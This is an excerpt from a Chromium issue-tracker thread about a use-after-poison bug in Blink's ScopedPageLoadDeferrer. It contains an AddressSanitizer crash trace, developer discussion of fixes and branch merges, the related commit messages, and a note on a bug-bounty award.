    #43 0x87e69e26 in base::internal::Invoker<base::internal::BindState<void (__thiscall base::CancelableCallback<void __cdecl(IPC::Message const &)>::*)(IPC::Message const &)const ,base::WeakPtr<base::CancelableCallback<void __cdecl(IPC::Message const &)> > >,void __cdecl(IPC::Message const &)>::Run+0x66 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x17e79e26)
    #44 0x8788a4e6 in base::internal::Invoker<base::internal::BindState<base::Callback<void __cdecl(gpu::SyncToken const &),1>,gpu::SyncToken>,void __cdecl(void)>::Run+0x36 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1789a4e6)
    #45 0x805d5df1 in base::debug::TaskAnnotator::RunTask+0x3f1 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x105e5df1)
    #46 0x8e782d13 in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue+0x993 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1e792d13)
    #47 0x8e77d11b in scheduler::TaskQueueManager::DoWork+0x6cb (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1e78d11b)
    #48 0x8e78757f in base::internal::Invoker<base::internal::BindState<void (__thiscall scheduler::TaskQueueManager::*)(base::TimeTicks,bool),base::WeakPtr<scheduler::TaskQueueManager>,base::TimeTicks,bool>,void __cdecl(void)>::Run+0x15f (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1e79757f)
    #49 0x805d5df1 in base::debug::TaskAnnotator::RunTask+0x3f1 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x105e5df1)
    #50 0x8049047b in base::MessageLoop::RunTask+0x6eb (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x104a047b)
    #51 0x804923fc in base::MessageLoop::DoWork+0x75c (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x104a23fc)
    #52 0x805decc8 in base::MessagePumpDefault::Run+0x378 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x105eecc8)
    #53 0x8048f4f5 in base::MessageLoop::RunHandler+0x45 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1049f4f5)
    #54 0x805df2ff in base::RunLoop::Run+0x1df (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x105ef2ff)
    #55 0x877a3b67 in content::RendererMain+0x567 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x177b3b67)
    #56 0x8034f9f7 in content::RunNamedProcessTypeMain+0x557 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1035f9f7)
    #57 0x803519c6 in content::ContentMainRunnerImpl::Run+0x2c6 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x103619c6)
    #58 0x8034eb14 in content::ContentMain+0x74 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x1035eb14)
    #59 0x7fff1181 in ChromeMain+0x181 (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x10001181)
    #60 0xd2c965 in MainDllLoader::Launch+0x485 (C:\chrome\asan-win32-release-408575\chrome.exe+0x40c965)
    #61 0xd222f9 in main+0x1209 (C:\chrome\asan-win32-release-408575\chrome.exe+0x4022f9)
    #62 0x2313dff in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:255
    #63 0x745e38f3 in BaseThreadInitThunk+0x23 (C:\WINDOWS\SYSTEM32\KERNEL32.DLL+0x6b8138f3)
    #64 0x77005de2 in RtlUnicodeStringToInteger+0x252 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e5de2)
    #65 0x77005dad in RtlUnicodeStringToInteger+0x21d (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e5dad)

AddressSanitizer can not describe address in more detail (wild memory access suspected).
SUMMARY: AddressSanitizer: use-after-poison (C:\chrome\asan-win32-release-408575\chrome_child.dll+0x14cbca92) in blink::ScopedPageLoadDeferrer::~ScopedPageLoadDeferrer+0x322
Shadow bytes around the buggy address:
  0x31d78f70: 00 00 00 00 00 00 00 04 f7 f7 f7 f7 f7 f7 f7 f7
  0x31d78f80: f7 f7 f7 f7 f7 f7 f7 f7 f7 00 04 00 04 00 04 00
  0x31d78f90: 00 04 00 00 04 00 00 04 00 00 04 00 00 04 00 00
  0x31d78fa0: 04 00 00 04 00 00 04 00 00 04 00 00 04 00 00 04
  0x31d78fb0: 00 00 04 00 00 04 00 00 04 00 00 04 00 00 04 00
=>0x31d78fc0: 00 00 00 04 f7 f7 f7[f7]f7 f7 f7 f7 f7 f7 f7 f7
  0x31d78fd0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x31d78fe0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 00
  0x31d78ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x31d79000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04
  0x31d79010: f7 f7 f7 f7 f7 00 00 00 00 00 00 00 00 04 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==960==ABORTING

### sh...@chromium.org (2016-08-08)

alexmos: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### al...@chromium.org (2016-08-08)

Status update per #32: the fixes for ScopedPageLoadDeferrer have landed in r406632 and r408354 and have baked enough to be merged, but I'm not sure we should request a merge before looking at the uaf from #31.  I haven't had a chance to look at that myself yet, and dcheng@ is currently OOO.  I'm not sure what the status of parser fix from #23 - dcheng@/dominicc@/kouhei@, can you give an update on that?  And afaict, running script via sendMessage while deferred still needs to be fixed in https://crbug.com/chromium/629431.

### dc...@chromium.org (2016-08-10)

I haven't investigated yet, but the problem is probably because I didn't make a copy of the HeapVector: we need to do this, because ordinaryPages() can be mutated during iteration. Doh.

### ko...@chromium.org (2016-08-12)

I think our conclusion re:parser is that the current behavior is spec compliant, thus no change required.

### bu...@chromium.org (2016-08-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/5544c19b4252cbf65eea6894d55b2ed486957079

commit 5544c19b4252cbf65eea6894d55b2ed486957079
Author: dcheng <dcheng@chromium.org>
Date: Mon Aug 15 23:57:48 2016

Copy Page::ordinaryPages() before undeferring loads.

Undeferring loads can run script, which can mutate the PageSet.

BUG=628942

Review-Url: https://codereview.chromium.org/2242923002
Cr-Commit-Position: refs/heads/master@{#412104}

[modify] https://crrev.com/5544c19b4252cbf65eea6894d55b2ed486957079/third_party/WebKit/Source/core/page/ScopedPageLoadDeferrer.cpp


### dc...@chromium.org (2016-08-17)

Note that three patches need to be merged to M52:

https://chromium.googlesource.com/chromium/src/+/07ff366089e56cb17712457e3f5e8469f034631b
https://chromium.googlesource.com/chromium/src.git/+/19ad54cb204cde45db95e773c5d54b04b2f178d4
https://chromium.googlesource.com/chromium/src.git/+/5544c19b4252cbf65eea6894d55b2ed486957079

In addition, there's a known merge conflict with a patch (https://chromium.googlesource.com/chromium/src/+/00314989401bfee5ffcb5e579162071c86e72f61) that was merged earlier. So this will be a somewhat tricky merge: is there any precedent for landing 3 CLs in one merge CL? I'd rather just land the final result.

### di...@chromium.org (2016-08-17)

[Automated comment] Request affecting a post-stable build (M52), manual review required.

### go...@chromium.org (2016-08-18)

We don't have any plan M52 release as of now as we will be promoting M53 to stable on 08/31/16. Please note that bar is VERY high for M52 stable, changes have to baked/verified in Canary/Dev and possibly on Beta and should be critical to justify M52 merge and respin.

awhalley@ & inferno@ to make a call whether we need to respin M52 or not for this issue.

dcheng@, do we need a merge to M53 for CLs listed at https://crbug.com/chromium/628942#c37. If so, please request a merge to M53.

### dc...@chromium.org (2016-08-18)

Yes, this needs to be merged into M53, with the same caveats about conflicts.

### di...@chromium.org (2016-08-18)

Your change meets the bar and is auto-approved for M53 (branch: 2785)

### go...@chromium.org (2016-08-18)

Please merge your change to M53 branch 2785 ASAP so we can take it for next week last M53 Beta release. Thank you.

### ha...@chromium.org (2016-08-18)

dcheng: Would you merge these changes? Do we need to merge both r408354 and r412104?


### dc...@chromium.org (2016-08-18)

Yes, plus one additional one (see c37). Going to try to do it in one commit to minimize the number of conflicts.

### sh...@chromium.org (2016-08-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-08-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/3ad5d6892dc7d738e4ca7d6f61a4317a3c429b52

commit 3ad5d6892dc7d738e4ca7d6f61a4317a3c429b52
Author: Daniel Cheng <dcheng@chromium.org>
Date: Fri Aug 19 19:24:34 2016

Defer loads in new pages/frames if ScopedPageLoadDeferral is active

BUG=628942

Review-Url: https://codereview.chromium.org/2174263002
Cr-Commit-Position: refs/heads/master@{#408354}
(cherry picked from commit 19ad54cb204cde45db95e773c5d54b04b2f178d4)

Review URL: https://codereview.chromium.org/2257933005 .

Cr-Commit-Position: refs/branch-heads/2785@{#683}
Cr-Branched-From: 68623971be0cfc492a2cb0427d7f478e7b214c24-refs/heads/master@{#403382}

[modify] https://crrev.com/3ad5d6892dc7d738e4ca7d6f61a4317a3c429b52/third_party/WebKit/Source/core/loader/DocumentLoader.cpp
[modify] https://crrev.com/3ad5d6892dc7d738e4ca7d6f61a4317a3c429b52/third_party/WebKit/Source/core/loader/FrameLoader.cpp
[modify] https://crrev.com/3ad5d6892dc7d738e4ca7d6f61a4317a3c429b52/third_party/WebKit/Source/core/page/Page.cpp
[modify] https://crrev.com/3ad5d6892dc7d738e4ca7d6f61a4317a3c429b52/third_party/WebKit/Source/core/page/ScopedPageLoadDeferrer.cpp
[modify] https://crrev.com/3ad5d6892dc7d738e4ca7d6f61a4317a3c429b52/third_party/WebKit/Source/core/page/ScopedPageLoadDeferrer.h
[modify] https://crrev.com/3ad5d6892dc7d738e4ca7d6f61a4317a3c429b52/third_party/WebKit/Source/web/tests/WebViewTest.cpp


### bu...@chromium.org (2016-08-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/b9f6a3cb9f00c20f4b22609dbf063fccd77e4b36

commit b9f6a3cb9f00c20f4b22609dbf063fccd77e4b36
Author: Daniel Cheng <dcheng@chromium.org>
Date: Fri Aug 19 19:35:39 2016

Copy Page::ordinaryPages() before undeferring loads.

Undeferring loads can run script, which can mutate the PageSet.

BUG=628942

Review-Url: https://codereview.chromium.org/2242923002
Cr-Commit-Position: refs/heads/master@{#412104}
(cherry picked from commit 5544c19b4252cbf65eea6894d55b2ed486957079)

Review URL: https://codereview.chromium.org/2254273005 .

Cr-Commit-Position: refs/branch-heads/2785@{#684}
Cr-Branched-From: 68623971be0cfc492a2cb0427d7f478e7b214c24-refs/heads/master@{#403382}

[modify] https://crrev.com/b9f6a3cb9f00c20f4b22609dbf063fccd77e4b36/third_party/WebKit/Source/core/page/ScopedPageLoadDeferrer.cpp


### dc...@chromium.org (2016-08-19)

https://codereview.chromium.org/2260903002/ was the first merge, not sure why it didn't show up in here.

### aw...@chromium.org (2016-08-24)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-30)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-30)

Very nice!  $7,500 for this report.  Cheers!

### aw...@chromium.org (2016-08-30)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-01)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-13)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-23)

Given there are several issues covered by this bug and we only previously awarded for one, the panel took another look and made an additional award!

### aw...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2016-12-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/baf4f1f0cca9c704ff01de23e9360a1deef00cb4

commit baf4f1f0cca9c704ff01de23e9360a1deef00cb4
Author: jochen <jochen@chromium.org>
Date: Mon Dec 05 15:21:05 2016

Assert that we never insert an frame element that already has a frame

BUG=628942,631151
R=dominicc@chromium.org

Review-Url: https://codereview.chromium.org/2190523002
Cr-Commit-Position: refs/heads/master@{#436294}

[modify] https://crrev.com/baf4f1f0cca9c704ff01de23e9360a1deef00cb4/third_party/WebKit/Source/core/html/HTMLFrameElementBase.cpp


### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-21)

This issue was migrated from crbug.com/chromium/628942?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>SecurityFeature, Internals>Sandbox>SiteIsolation]
[Monorail blocked-on: crbug.com/chromium/629431]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084865)*
